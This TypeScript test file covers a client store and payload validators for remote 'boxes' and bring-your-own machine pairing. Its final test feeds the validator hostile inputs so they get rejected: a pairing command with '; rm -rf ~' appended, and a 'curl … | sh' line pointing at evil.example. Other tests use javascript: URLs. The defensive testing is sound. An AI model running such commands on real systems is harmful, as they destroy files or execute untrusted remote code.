import assert from "node:assert/strict";
import { beforeEach, describe, it } from "node:test";

import {
  BOXES_CHANGED_EVENT,
  BOX_CONFIG_CHANGES_EVENT,
  BOX_PROVIDERS_CHANGED_EVENT,
  type BoxesResponse
} from "@orquester/api";

import {
  applyBoxesEvent,
  boxesStore,
  decideBoxConfigChange,
  destroyBox,
  loadBoxes,
  loadBoxesList,
  loadBoxOffers,
  prepareBoxWindowsImage,
  projectBoxIn,
  resetBoxes,
  saveBoxConnection,
  setupBoxTailscaleServe,
  saveBoxProviderCredentials,
  setBoxesPluginOn,
  type BoxesApi
} from "./store.ts";
import {
  readDestroyedReason,
  runsInBox,
  sanitizeBoxConfigChangeSet,
  sanitizeBoxMcpRunInBoxResponse,
  sanitizeBoxOffersResponse,
  sanitizeBoxProviderInfo,
  sanitizeBoxSummary,
  sanitizeByoPairingResponse,
  sanitizeBoxesResponse
} from "./validate.ts";
import { box, change, kind, offers, provider } from "./fixtures.test-helpers.ts";

const TOTALS = { activeCount: 1, hourlyUsd: 0.0119, monthEstimatedUsd: 3.1 };
const listOf = (...boxes: ReturnType<typeof box>[]): BoxesResponse => ({ boxes, totals: TOTALS });

/** A deferred answer: the test decides when (and with what) a read resolves. */
function deferred<T>() {
  let resolve!: (value: T) => void;
  let reject!: (error: unknown) => void;
  const promise = new Promise<T>((res, rej) => {
    resolve = res;
    reject = rej;
  });
  return { promise, resolve, reject };
}

function fakeApi(overrides: Partial<Record<keyof BoxesApi, unknown>> = {}, connection = "c1") {
  const calls: string[] = [];
  const api: Record<string, unknown> = {
    connection: { id: connection },
    listBoxes: async () => (calls.push("listBoxes"), listOf(box())),
    destroyBox: async (id: string) => (calls.push(`destroyBox:${id}`), { box: box({ id, state: "destroying" }) }),
    listBoxKinds: async () => (calls.push("listBoxKinds"), { kinds: [kind()] }),
    listBoxProviders: async () => (calls.push("listBoxProviders"), { providers: [provider()] }),
    setBoxProviderCredentials: async (id: string) => (calls.push(`setCreds:${id}`), provider({ id: id as never })),
    removeBoxProviderCredentials: async () => undefined,
    getBoxOffers: async (id: string, k: string) => (calls.push(`offers:${id}:${k}`), offers()),
    prepareBoxWindowsImage: async () => (calls.push("prepare"), undefined),
    getBoxConnection: async () => ({ mode: "public-url", publicUrl: "https://o.example.com", tailscale: {}, reachable: "ok" }),
    setBoxConnection: async () => ({ mode: "tailscale", tailscale: { configured: true }, reachable: "unknown" }),
    testBoxConnection: async () => ({ mode: "public-url", reachable: "ok" }),
    getBlacksmithSetup: async () => ({ steps: [] }),
    setBlacksmithSetup: async () => ({ steps: [] }),
    startBlacksmithTest: async () => undefined,
    listBoxConfigChanges: async () => (calls.push("listChanges"), { changes: [change()] }),
    decideBoxConfigChange: async (id: string) => ({ change: change({ id, state: "approved" }) }),
    ...overrides
  };
  return { api: api as unknown as BoxesApi, calls };
}

const flush = async () => {
  for (let i = 0; i < 10; i += 1) await Promise.resolve();
};

describe("box payload validation", () => {
  it("keeps a well-formed box as it is", () => {
    assert.deepEqual(sanitizeBoxSummary(box()), box());
  });

  it("drops a box it cannot reason about", () => {
    assert.equal(sanitizeBoxSummary(null), null);
    assert.equal(sanitizeBoxSummary([]), null);
    assert.equal(sanitizeBoxSummary({ ...box(), id: "" }), null);
    assert.equal(sanitizeBoxSummary({ ...box(), state: "hibernating" }), null);
    assert.equal(sanitizeBoxSummary({ ...box(), kind: "solaris" }), null);
    assert.equal(sanitizeBoxSummary({ ...box(), provider: "aws" }), null);
    assert.equal(sanitizeBoxSummary({ ...box(), purpose: "forever" }), null);
  });

  it("repairs bad optional fields one by one", () => {
    const clean = sanitizeBoxSummary({
      ...box(),
      providerLabel: 7,
      hourlyUsd: -1,
      estimatedCostUsd: "lots",
      os: "plan9",
      destroyedReason: "aliens",
      connected: "yes",
      project: { path: "" },
      setup: [{ id: "create", state: "weird" }, { id: "nope" }, "x", { id: "create", state: "done" }],
      extra: "unknown field"
    });
    assert.ok(clean);
    assert.equal(clean.providerLabel, "hetzner");
    assert.equal(clean.hourlyUsd, null);
    assert.equal(clean.estimatedCostUsd, 0);
    assert.equal(clean.os, null);
    assert.equal(clean.destroyedReason, null);
    assert.equal(clean.connected, false);
    assert.equal(clean.project, null);
    // Unknown steps and duplicates are left out; a bad state reads as pending.
    assert.deepEqual(clean.setup, [
      { id: "create", label: "create", state: "pending", startedAt: null, finishedAt: null, message: null }
    ]);
    assert.equal("extra" in clean, false);
  });

  it("rejects a broken list envelope and recomputes missing totals", () => {
    assert.equal(sanitizeBoxesResponse({ boxes: "nope" }), null);
    assert.equal(sanitizeBoxesResponse(null), null);
    const response = sanitizeBoxesResponse({
      boxes: [box({ id: "a", hourlyUsd: 0.5 }), box({ id: "b", state: "destroyed", hourlyUsd: 2 }), { id: "bad" }, box({ id: "a" })]
    });
    assert.ok(response);
    assert.deepEqual(response.boxes.map((entry) => entry.id), ["a", "b"]);
    assert.deepEqual(response.totals, { activeCount: 1, hourlyUsd: 0.5, monthEstimatedUsd: 0.84 });
  });

  it("reads a config change set, leaving out files that do not read", () => {
    assert.deepEqual(sanitizeBoxConfigChangeSet(change()), change());
    const files = change().files;
    const set = sanitizeBoxConfigChangeSet({ ...change(), files: [{ path: "" }, "x", ...files] });
    assert.deepEqual(set?.files, files);
    assert.equal(sanitizeBoxConfigChangeSet({ ...change(), state: "maybe" }), null);
    assert.equal(sanitizeBoxConfigChangeSet({ ...change(), boxId: "" }), null);
  });

  it("reads the Global MCP servers' Run in box settings", () => {
    assert.equal(sanitizeBoxMcpRunInBoxResponse({ servers: "nope" }), null);
    const response = sanitizeBoxMcpRunInBoxResponse({
      servers: [
        { agent: "claude", name: "jira", runInBox: true },
        { agent: "claude", name: "jira", runInBox: false },
        { agent: "codex", name: "jira", runInBox: "yes" },
        { agent: "", name: "x", runInBox: true },
        "junk"
      ]
    });
    assert.deepEqual(response, {
      servers: [
        { agent: "claude", name: "jira", runInBox: true },
        { agent: "codex", name: "jira", runInBox: false }
      ]
    });
    assert.equal(runsInBox(response!, "claude", "jira"), true);
    assert.equal(runsInBox(response!, "codex", "jira"), false);
    assert.equal(runsInBox(response!, "grok", "jira"), false);
  });

  it("narrows a destroyed reason to the ones this build knows", () => {
    assert.equal(readDestroyedReason("provider-gone"), "provider-gone");
    assert.equal(readDestroyedReason("meteor"), null);
    assert.equal(readDestroyedReason(undefined), null);
  });

  it("only links http(s) URLs and masks fields of unknown secrecy", () => {
    const clean = sanitizeBoxProviderInfo({
      ...provider(),
      credentialsUrl: "javascript:alert(1)",
      website: "not a url",
      kinds: ["linux", "linux", "mainframe"],
      credentialFields: [{ id: "token", label: "Token" }, { id: "user", label: "User", secret: false }, { label: "No id" }],
      status: "sleeping",
      maxLifetimeMinutes: 0,
      windowsImage: { state: "baking" }
    });
    assert.ok(clean);
    assert.equal(clean.credentialsUrl, "");
    assert.equal(clean.website, "");
    assert.deepEqual(clean.kinds, ["linux"]);
    assert.deepEqual(clean.credentialFields, [
      { id: "token", label: "Token", secret: true },
      { id: "user", label: "User", secret: false }
    ]);
    assert.equal(clean.status, "not-configured");
    assert.equal(clean.maxLifetimeMinutes, null);
    assert.deepEqual(clean.windowsImage, { state: "none", message: null, updatedAt: null });
    assert.equal(sanitizeBoxProviderInfo({ ...provider(), id: "aws" }), null);
  });

  it("drops offers for another provider or kind, and sizes rented nowhere", () => {
    assert.equal(sanitizeBoxOffersResponse(offers(), "vultr", "linux"), null);
    assert.equal(sanitizeBoxOffersResponse(offers(), "hetzner", "windows"), null);
    const clean = sanitizeBoxOffersResponse(
      {
        ...offers(),
        sizes: [
          ...offers().sizes,
          { id: "ghost", label: "Ghost", vcpu: 1, ramGb: 1, gpu: null, hourlyUsd: 0.001, regions: ["mars"] },
          { id: "", label: "No id" }
        ],
        priceSource: "guess"
      },
      "hetzner",
      "linux"
    );
    assert.ok(clean);
    assert.deepEqual(clean.sizes.map((size) => size.id), ["cx32", "cx22", "ccx13"]);
    assert.equal(clean.priceSource, "table");
  });
});

describe("the boxes store", () => {
  beforeEach(() => {
    setBoxesPluginOn(true);
    resetBoxes();
  });

  it("loads every slot the plugin needs", async () => {
    const { api, calls } = fakeApi();
    await loadBoxes(api);
    const state = boxesStore.getState();
    assert.deepEqual(state.boxes?.map((entry) => entry.id), ["b1"]);
    assert.deepEqual(state.totals, TOTALS);
    assert.deepEqual(state.providers?.map((entry) => entry.id), ["hetzner"]);
    assert.deepEqual(state.kinds?.map((entry) => entry.kind), ["linux"]);
    assert.deepEqual(state.configChanges?.map((entry) => entry.id), ["c1"]);
    assert.deepEqual(calls.sort(), ["listBoxKinds", "listBoxProviders", "listBoxes", "listChanges"]);
  });

  it("rejects a list in another shape and keeps what it holds", async () => {
    const { api } = fakeApi();
    await loadBoxesList(api);
    const bad = fakeApi({ listBoxes: async () => ({ boxes: 3 }) });
    await assert.rejects(loadBoxesList(bad.api), /unexpected shape/);
    assert.deepEqual(boxesStore.getState().boxes?.map((entry) => entry.id), ["b1"]);
  });

  it("applies each event type and ignores malformed or unknown ones", () => {
    applyBoxesEvent({ type: BOXES_CHANGED_EVENT, payload: listOf(box({ id: "x" })) });
    assert.deepEqual(boxesStore.getState().boxes?.map((entry) => entry.id), ["x"]);
    applyBoxesEvent({ type: BOXES_CHANGED_EVENT, payload: { boxes: null } });
    applyBoxesEvent({ type: BOXES_CHANGED_EVENT, payload: "garbage" });
    applyBoxesEvent({ type: "boxes.somethingNew", payload: listOf() });
    assert.deepEqual(boxesStore.getState().boxes?.map((entry) => entry.id), ["x"]);

    applyBoxesEvent({ type: BOX_PROVIDERS_CHANGED_EVENT, payload: { providers: [provider({ id: "vultr", label: "Vultr" }), { id: "aws" }] } });
    assert.deepEqual(boxesStore.getState().providers?.map((entry) => entry.id), ["vultr"]);

    applyBoxesEvent({ type: BOX_CONFIG_CHANGES_EVENT, payload: { changes: [change(), { id: "c2", boxId: "b1", state: "??" }] } });
    assert.deepEqual(boxesStore.getState().configChanges?.map((entry) => entry.id), ["c1"]);
  });

  it("drops a load's answer when an event overtook it", async () => {
    const answer = deferred<BoxesResponse>();
    const { api } = fakeApi({ listBoxes: () => answer.promise });
    const loading = loadBoxesList(api);
    applyBoxesEvent({ type: BOXES_CHANGED_EVENT, payload: listOf(box({ id: "newer" })) });
    answer.resolve(listOf(box({ id: "older" })));
    await loading;
    assert.deepEqual(boxesStore.getState().boxes?.map((entry) => entry.id), ["newer"]);
  });

  it("drops answers that arrive after a reset, and resets for another connection", async () => {
    const answer = deferred<BoxesResponse>();
    const first = fakeApi({ listBoxes: () => answer.promise }, "c1");
    const loading = loadBoxesList(first.api);
    resetBoxes();
    answer.resolve(listOf(box({ id: "stale" })));
    await loading;
    assert.equal(boxesStore.getState().boxes, null);

    await loadBoxesList(fakeApi({}, "c1").api);
    assert.equal(boxesStore.getState().boxes?.length, 1);
    // A client of another connection: the old daemon's boxes go first.
    const other = fakeApi({ listBoxes: async () => listOf(box({ id: "elsewhere" })), listBoxProviders: async () => ({ providers: [] }) }, "c2");
    applyBoxesEvent({ type: BOX_PROVIDERS_CHANGED_EVENT, payload: { providers: [provider()] } });
    await loadBoxesList(other.api);
    assert.deepEqual(boxesStore.getState().boxes?.map((entry) => entry.id), ["elsewhere"]);
    assert.equal(boxesStore.getState().providers, null);
  });

  it("applies a destroy's answer to its box, and reloads when the answer is unreadable", async () => {
    const { api } = fakeApi();
    await loadBoxesList(api);
    await destroyBox(api, "b1");
    assert.equal(boxesStore.getState().boxes?.[0].state, "destroying");

    const silent = fakeApi({ destroyBox: async () => undefined });
    await destroyBox(silent.api, "b1");
    await flush();
    assert.ok(silent.calls.includes("listBoxes"));
  });

  it("refuses a destroy the daemon refuses, leaving the box as it was", async () => {
    const { api } = fakeApi({
      destroyBox: async () => {
        throw Object.assign(new Error("409"), { status: 409, body: { code: "BOX_IS_PROJECT" } });
      }
    });
    await loadBoxesList(api);
    await assert.rejects(destroyBox(api, "b1"), /409/);
    assert.equal(boxesStore.getState().boxes?.[0].state, "ready");
  });

  it("saving credentials upserts the provider and re-reads the kinds that were loaded", async () => {
    const { api, calls } = fakeApi({
      setBoxProviderCredentials: async (id: string) => (calls.push(`set:${id}`), provider({ id: "vultr", label: "Vultr", kinds: ["linux", "windows"] }))
    });
    await loadBoxes(api);
    calls.length = 0;
    const saved = await saveBoxProviderCredentials(api, "vultr", { key: "abc" });
    assert.equal(saved?.id, "vultr");
    await flush();
    assert.deepEqual(boxesStore.getState().providers?.map((entry) => entry.id), ["hetzner", "vultr"]);
    assert.ok(calls.includes("listBoxKinds"));
  });

  it("a provider change event drops cached offers and re-reads the kinds", async () => {
    const { api, calls } = fakeApi();
    await loadBoxes(api);
    await loadBoxOffers(api, "hetzner", "linux");
    await loadBoxOffers(api, "hetzner", "linux");
    assert.equal(calls.filter((call) => call.startsWith("offers:")).length, 1);
    calls.length = 0;
    applyBoxesEvent({ type: BOX_PROVIDERS_CHANGED_EVENT, payload: { providers: [provider()] } });
    await flush();
    assert.ok(calls.includes("listBoxKinds"));
    await loadBoxOffers(api, "hetzner", "linux");
    assert.equal(calls.filter((call) => call.startsWith("offers:")).length, 1);
  });

  it("shares an offers read in flight and rejects one in another shape", async () => {
    const answer = deferred<unknown>();
    const { api, calls } = fakeApi({ getBoxOffers: (id: string, k: string) => (calls.push(`offers:${id}:${k}`), answer.promise) });
    const a = loadBoxOffers(api, "hetzner", "linux");
    const b = loadBoxOffers(api, "hetzner", "linux");
    answer.resolve(offers());
    assert.equal(await a, await b);
    assert.equal(calls.filter((call) => call.startsWith("offers:")).length, 1);

    const wrong = fakeApi({ getBoxOffers: async () => offers({ kind: "windows" }) });
    await assert.rejects(loadBoxOffers(wrong.api, "hetzner", "linux", { fresh: true }), /unexpected shape/);
  });

  it("marks a Windows image as preparing at once", async () => {
    const { api } = fakeApi({
      listBoxProviders: async () => ({
        providers: [provider({ id: "vultr", windowsImage: { state: "none", message: null, updatedAt: null } })]
      })
    });
    await loadBoxes(api);
    // The reload after the POST answers "none" again — but a later read, so it is applied.
    const slow = deferred<unknown>();
    const { api: second } = fakeApi({
      listBoxProviders: () => slow.promise
    });
    await prepareBoxWindowsImage(second, "vultr");
    assert.equal(boxesStore.getState().providers?.[0].windowsImage?.state, "preparing");
    slow.resolve({ providers: [provider({ id: "vultr", windowsImage: { state: "preparing", message: "Building", updatedAt: null } })] });
    await flush();
    assert.equal(boxesStore.getState().providers?.[0].windowsImage?.message, "Building");
  });

  it("connection answers are validated, and a decision updates its change set", async () => {
    const { api } = fakeApi();
    const settings = await saveBoxConnection(api, { mode: "tailscale" });
    assert.equal(settings.mode, "tailscale");
    assert.equal(settings.tailscale.configured, true);
    assert.equal(settings.tailscale.policySnippet, "");
    assert.equal(boxesStore.getState().connection?.mode, "tailscale");

    await loadBoxes(api);
    await decideBoxConfigChange(api, "c1", "approve");
    assert.equal(boxesStore.getState().configChanges?.[0].state, "approved");

    // Tailscale on the daemon's machine: validated, absent when malformed.
    const local = { installed: true, running: true, dnsName: "pc.tail1.ts.net", tailnetIp: "100.64.0.7", servePort: 10000, serving: true, suggestedUrl: "https://pc.tail1.ts.net:10000", serveCommand: "tailscale serve --bg --https=10000 http://127.0.0.1:47831" };
    const served = fakeApi({ setupBoxTailscaleServe: async () => ({ mode: "tailscale", tailscale: { configured: true, daemonUrl: "https://pc.tail1.ts.net:10000", local }, reachable: "ok" }) });
    const setUp = await setupBoxTailscaleServe(served.api);
    assert.deepEqual(setUp.tailscale.local, local);
    assert.equal(boxesStore.getState().connection?.tailscale.daemonUrl, "https://pc.tail1.ts.net:10000");
    const odd = fakeApi({ setBoxConnection: async () => ({ mode: "tailscale", tailscale: { local: { installed: "yes" } } }) });
    assert.equal((await saveBoxConnection(odd.api, {})).tailscale.local, undefined);
    const partial = fakeApi({ setBoxConnection: async () => ({ mode: "tailscale", tailscale: { local: { installed: true, servePort: -1, suggestedUrl: "javascript:x" } } }) });
    assert.deepEqual((await saveBoxConnection(partial.api, {})).tailscale.local, {
      installed: true,
      running: false,
      dnsName: null,
      tailnetIp: null,
      servePort: 10000,
      serving: false,
      suggestedUrl: null,
      serveCommand: null
    });

    const bad = fakeApi({ setBoxConnection: async () => "nope" });
    await assert.rejects(saveBoxConnection(bad.api, {}), /unexpected shape/);
  });

  it("drops a destroy's answer an event overtook, and re-reads the list instead", async () => {
    const answer = deferred<unknown>();
    const { api, calls } = fakeApi({
      destroyBox: () => answer.promise,
      listBoxes: async () => (calls.push("listBoxes"), listOf(box({ id: "b1", state: "destroyed" })))
    });
    applyBoxesEvent({ type: BOXES_CHANGED_EVENT, payload: listOf(box({ id: "b1" })) });
    const destroying = destroyBox(api, "b1");
    // The daemon's event about the same box lands before its answer: it is newer.
    applyBoxesEvent({ type: BOXES_CHANGED_EVENT, payload: listOf(box({ id: "b1", state: "destroyed" })) });
    answer.resolve({ box: box({ id: "b1", state: "destroying" }) });
    await destroying;
    assert.equal(boxesStore.getState().boxes?.[0].state, "destroyed");
    await flush();
    assert.ok(calls.includes("listBoxes"));
    assert.equal(boxesStore.getState().boxes?.[0].state, "destroyed");
  });

  it("drops a decision's answer an event overtook, and an older connection answer than the newer save's", async () => {
    const decided = deferred<unknown>();
    const { api } = fakeApi({
      decideBoxConfigChange: () => decided.promise,
      listBoxConfigChanges: async () => ({ changes: [change({ state: "denied" })] })
    });
    applyBoxesEvent({ type: BOX_CONFIG_CHANGES_EVENT, payload: { changes: [change()] } });
    const deciding = decideBoxConfigChange(api, "c1", "approve");
    applyBoxesEvent({ type: BOX_CONFIG_CHANGES_EVENT, payload: { changes: [change({ state: "denied" })] } });
    decided.resolve({ change: change({ state: "approved" }) });
    const answered = await deciding;
    // The caller still learns the answer; the store keeps the newer event.
    assert.equal(answered?.state, "approved");
    assert.equal(boxesStore.getState().configChanges?.[0].state, "denied");

    const first = deferred<unknown>();
    const reads: string[] = [];
    const second = fakeApi({
      setBoxConnection: (req: { publicUrl?: string }) =>
        req.publicUrl === "https://a.example.com"
          ? first.promise
          : Promise.resolve({ mode: "public-url", publicUrl: req.publicUrl, tailscale: {}, reachable: "unknown" }),
      getBoxConnection: async () => (reads.push("get"), { mode: "public-url", publicUrl: "https://b.example.com", tailscale: {}, reachable: "unknown" })
    });
    const older = saveBoxConnection(second.api, { publicUrl: "https://a.example.com" });
    await saveBoxConnection(second.api, { publicUrl: "https://b.example.com" });
    first.resolve({ mode: "public-url", publicUrl: "https://a.example.com", tailscale: {}, reachable: "unknown" });
    await older;
    await flush();
    assert.deepEqual(reads, ["get"]);
    assert.equal(boxesStore.getState().connection?.publicUrl, "https://b.example.com");
  });

  it("with the plugin off, keeps only the boxes still running and lets them be destroyed", async () => {
    const { api } = fakeApi({
      listBoxes: async () => listOf(box({ id: "p1" }), box({ id: "t1", purpose: "temporary", project: null }), box({ id: "gone", state: "destroyed" })),
      destroyBox: async (id: string) => ({ box: box({ id, purpose: "temporary", project: null, state: "destroying" }) })
    });
    await loadBoxes(api);
    await saveBoxConnection(api, { mode: "tailscale" });
    setBoxesPluginOn(false);
    const state = boxesStore.getState();
    assert.deepEqual(state.boxes?.map((entry) => entry.id), ["p1", "t1", "gone"]);
    assert.equal(state.providers, null);
    assert.equal(state.kinds, null);
    assert.equal(state.configChanges, null);
    assert.equal(state.connection, null);
    // Other slots stay empty: their events are not held while the plugin is off.
    applyBoxesEvent({ type: BOX_PROVIDERS_CHANGED_EVENT, payload: { providers: [provider()] } });
    applyBoxesEvent({ type: BOX_CONFIG_CHANGES_EVENT, payload: { changes: [change()] } });
    assert.equal(boxesStore.getState().providers, null);
    assert.equal(boxesStore.getState().configChanges, null);

    // Destroy still works, and the list follows its events.
    await destroyBox(api, "t1");
    assert.equal(boxesStore.getState().boxes?.find((entry) => entry.id === "t1")?.state, "destroying");
    applyBoxesEvent({ type: BOXES_CHANGED_EVENT, payload: listOf(box({ id: "p1" }), box({ id: "t1", state: "destroyed" })) });
    assert.deepEqual(boxesStore.getState().boxes?.map((entry) => entry.id), ["p1", "t1"]);

    // Nothing left running: the list is forgotten.
    applyBoxesEvent({ type: BOXES_CHANGED_EVENT, payload: listOf(box({ id: "p1", state: "destroyed" }), box({ id: "t1", state: "destroyed" })) });
    assert.equal(boxesStore.getState().boxes, null);
  });

  it("with the plugin off, a read that finds nothing running holds nothing", async () => {
    setBoxesPluginOn(false);
    await loadBoxesList(fakeApi({ listBoxes: async () => listOf(box({ state: "destroyed" })) }).api);
    assert.equal(boxesStore.getState().boxes, null);
    await loadBoxesList(fakeApi({ listBoxes: async () => listOf(box({ state: "destroy-failed" })) }).api);
    assert.deepEqual(boxesStore.getState().boxes?.map((entry) => entry.state), ["destroy-failed"]);

    // Turning off with a list of destroyed boxes only forgets it at once.
    setBoxesPluginOn(true);
    applyBoxesEvent({ type: BOXES_CHANGED_EVENT, payload: listOf(box({ state: "destroyed" })) });
    assert.equal(boxesStore.getState().boxes?.length, 1);
    setBoxesPluginOn(false);
    assert.equal(boxesStore.getState().boxes, null);
  });

  it("finds a project's box: the live one, else the latest destroyed", () => {
    const path = "/w/jaspersito/JasperEngine";
    const project = { workspace: "jaspersito", name: "JasperEngine", path };
    const gone1 = box({ id: "g1", state: "destroyed", destroyedAt: "2026-10-19T00:00:00.000Z", project });
    const gone2 = box({ id: "g2", state: "destroyed", destroyedAt: "2026-10-20T00:00:00.000Z", project });
    const live = box({ id: "live", project });
    const temp = box({ id: "temp", purpose: "temporary", project });
    assert.equal(projectBoxIn([gone1, gone2], path)?.id, "g2");
    assert.equal(projectBoxIn([gone1, temp, live, gone2], path)?.id, "live");
    assert.equal(projectBoxIn([temp], path), undefined);
    assert.equal(projectBoxIn(null, path), undefined);
    assert.equal(projectBoxIn([live], undefined), undefined);
  });
});

describe("bring-your-own machine payloads", () => {
  const machine = { ...box(), id: "m1", purpose: "machine", provider: "byo", sizeLabel: "Mac mini", state: "pairing", deviceHost: true, byo: { name: "Mac mini", pairingExpiresAt: "2026-10-27T10:30:00.000Z" } };

  it("keeps the machine purpose, the new states, the device-host flag and the byo fields", () => {
    const clean = sanitizeBoxSummary(machine)!;
    assert.equal(clean.purpose, "machine");
    assert.equal(clean.state, "pairing");
    assert.equal(clean.deviceHost, true);
    assert.deepEqual(clean.byo, { name: "Mac mini", pairingExpiresAt: "2026-10-27T10:30:00.000Z" });
    assert.equal(sanitizeBoxSummary({ ...machine, state: "offline" })?.state, "offline");
    // A byo box with a broken byo field still shows, named after its size label.
    assert.deepEqual(sanitizeBoxSummary({ ...machine, byo: 3 })?.byo, { name: "Mac mini", pairingExpiresAt: null });
    assert.equal(sanitizeBoxSummary({ ...box(), deviceHost: "yes" })?.deviceHost, undefined);
  });

  it("a pairing answer is kept only with a curl … | sh command to the pair route", () => {
    const command = "curl -fsSL https://orq.example.com/api/boxes/pair/AbC_12-x | sh";
    assert.equal(sanitizeByoPairingResponse({ box: machine, command, expiresAt: "2026-10-27T10:30:00.000Z" })?.command, command);
    assert.equal(sanitizeByoPairingResponse({ box: machine, command: `${command}; rm -rf ~`, expiresAt: "x" }), null);
    assert.equal(sanitizeByoPairingResponse({ box: machine, command: "curl -fsSL https://evil.example/x | sh", expiresAt: "x" }), null);
    assert.equal(sanitizeByoPairingResponse({ box: null, command, expiresAt: "x" }), null);
    assert.equal(sanitizeByoPairingResponse({ box: machine, command }), null);
  });
});
